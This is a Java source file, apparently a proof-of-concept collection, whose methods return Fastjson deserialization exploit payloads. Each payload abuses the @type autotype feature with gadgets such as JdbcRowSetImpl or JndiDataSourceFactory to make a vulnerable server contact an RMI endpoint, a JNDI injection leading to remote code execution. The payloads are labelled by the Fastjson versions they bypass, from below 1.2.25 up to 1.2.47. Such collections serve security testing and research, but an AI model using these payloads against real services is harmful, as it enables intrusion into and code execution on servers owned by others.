package com.venscor;

/**
 * @ClassName PoC
 * @Description TODO
 * @Author venscor
 * @Create Time 2019-07-11 22:37
 * @Version 1.0
 */
public class PoC {

    /*
     * @Author venscor
     * @Description  jdbcRowSetImplPayload 1.2.25以下的poc
     * @Date 14:13 2019-07-12
     * @Param []
     * @return java.lang.String
     **/
    public static String jdbcRowSetImplPayload24() {
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/RemoteBean\"," + "\"autoCommit\":true}";
        return payload;
    }

    /*
     * @Author venscor
     * @Description  jdbcRowSetImplPayloadNew 1.2.47以下bypass的poc
     * @Date 14:13 2019-07-12
     * @Param []
     * @return java.lang.String
     **/
    public static String jdbcRowSetImplPayload47() {
        String payload = "{\"fuck\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"fuck\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost/RemoteBean\",\"autoCommit\":true}}\n";
        return payload;
    }

    /*
     * @Author venscor
     * @Description  jdbcRowSetImplPayload41 1.2.41 绕过
     * 需要业务开启-Dfastjson.parser.autoTypeSupport=true，危害稍微低一点
     * @Date 14:33 2019-07-12
     * @Param []
     * @return java.lang.String
     **/
    public static String jdbcRowSetImplPayload41() {
        String payload = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://127.0.0.1:1099/RemoteBean\"," + "\"autoCommit\":true}";
        return payload;
    }

    /*
     * @Author venscor
     * @Description  jdbcRowSetImplPayload42 1.2.42 绕过
     * 需要业务开启-Dfastjson.parser.autoTypeSupport=true，危害稍微低一点
     * @Date 14:33 2019-07-12
     * @Param []
     * @return java.lang.String
     **/
    public static String jdbcRowSetImplPayload42() {
        String payload = "{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"rmi://127.0.0.1:1099/RemoteBean\"," + "\"autoCommit\":true}";
        return payload;
    }

    /*
     * @Author venscor
     * @Description  jdbcRowSetImplPayload43 1.2.43绕过
     * 需要业务开启-Dfastjson.parser.autoTypeSupport=true，危害稍微低一点
     * @Date 14:54 2019-07-12
     * @Param []
     * @return java.lang.String
     **/
    public static String jdbcRowSetImplPayload43() {
        String payload = "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/RemoteBean\"," + "\"autoCommit\":true}";
        return payload;
    }

    /*
     * @Author venscor
     * @Description  jdbcRowSetImplPayload45 1.2.45绕过
     * 需要业务开启-Dfastjson.parser.autoTypeSupport=true，危害稍微低一点
     * @Date 14:54 2019-07-12
     * @Param []
     * @return java.lang.String
     **/
    public static String jdbcRowSetImplPayload45() {
        String payload = "{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"rmi://localhost:1099/RemoteBean\"}}";
        return payload;
    }


    /*
     * @Author venscor
     * @Description  blackListAddress 安全研究人员对类blacklist的研究
     * @Date 14:35 2019-07-12
     * @Param []
     * @return java.lang.String
     **/
    public static String blackListAddress() {
        String url = "https://github.com/LeadroyaL/fastjson-blacklist";
        return url;
    }
}
